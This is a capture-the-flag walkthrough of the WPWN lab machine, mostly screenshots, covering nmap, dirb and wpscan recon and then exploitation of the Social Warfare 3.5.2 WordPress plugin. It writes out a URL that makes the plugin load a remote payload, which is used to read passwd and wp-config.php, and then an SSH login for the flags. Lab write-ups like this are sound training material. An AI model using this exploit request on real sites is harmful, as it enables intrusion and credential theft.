*WPWN*  

**RECON**
---
**Ip Search**  
Our IP leads us to this blank page lets move to scanning  
![image6](https://user-images.githubusercontent.com/66635295/158526173-aa39b52e-d9c3-4ac0-8865-9792b5497a4f.png)
**Nmap Scan**  
[nmap -sV -sC 192.168.55.123]  
-version -safescan
Port 22, and 80 are open  
![image3](https://user-images.githubusercontent.com/66635295/158744691-d688bd5d-81d7-4af4-b510-a2e1b527177f.png)  
**Scan for hidden directories (dirbuster)**   
[dirb http:// 192.168.55.123]  
![image8](https://user-images.githubusercontent.com/66635295/158747642-86dbd602-e37e-499f-b37f-430b1b4870e5.png)  
**WordPress Page**  
![image7](https://user-images.githubusercontent.com/66635295/158747979-04e74459-23fc-4d85-add5-2ddb83e22836.png)  
**Scan for wordpress vulnerabilities**   
[wpscan --url http:// 192.168.55.123/wordpress/]
![image1](https://user-images.githubusercontent.com/66635295/158748297-d989c1f4-acdc-4e01-bef1-9e606e4ed10c.png)  
**Scan reveals outdated plugin named Social-Warfare 3.5.2**  
This Vulnerability allows commands to run for obtaining user Credentials  
![image15](https://user-images.githubusercontent.com/66635295/158748468-74c92d41-881e-4414-9070-43a2bb30d4f1.png)  
**Payload File**    
Shows passwd file contents  
![image5](https://user-images.githubusercontent.com/66635295/158751852-ada62fb4-56f6-4e2f-ae20-68cd67dd5b81.png)

**Python Simple server**  
[python3 -m http.server 80]  
![image14](https://user-images.githubusercontent.com/66635295/158752244-0f7a0d8f-8f83-41cd-b61b-d747a62290ce.png)




**ENUMURATION**
---
**Visit Website**  
[http:// 192.168.55.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://localhost/payload.txt]    
User Takis is revealed 
![image10](https://user-images.githubusercontent.com/66635295/158752455-4b285dee-5cd6-4449-a4f3-9d179e54d6a2.png)  
**Config.php**
Word press config.php holds important info. The payload can be used to check for it  
![image9](https://user-images.githubusercontent.com/66635295/158752587-5af73a09-806d-4ada-bb96-16bcc3e5bd9e.png)
**Visit Website**
Viewing the source reveals a password for a SQL database  
![image11](https://user-images.githubusercontent.com/66635295/158753420-c9d6f360-973a-4eb9-b88d-afbf3f213196.png)

**Privilege Escalation**
---
**Server SSH**
[sudo ssh takis@192.168.55.123]  
![image4](https://user-images.githubusercontent.com/66635295/158753672-415311f6-028b-4345-8a98-cfcf7a3a7ed9.png)
**User Flag**    
local.txt  
![image13](https://user-images.githubusercontent.com/66635295/158753764-e78a55f8-f9fa-4179-8dc4-fe9691bcf19c.png)   
**Check User Privileges**  
![image12](https://user-images.githubusercontent.com/66635295/158753967-f2d267fc-93d9-442f-94c4-b7463bf2db7c.png)  
**Root Flag**  
![image10](https://user-images.githubusercontent.com/66635295/158754242-21d85cde-d062-443b-907e-0898f5b8d45d.png)

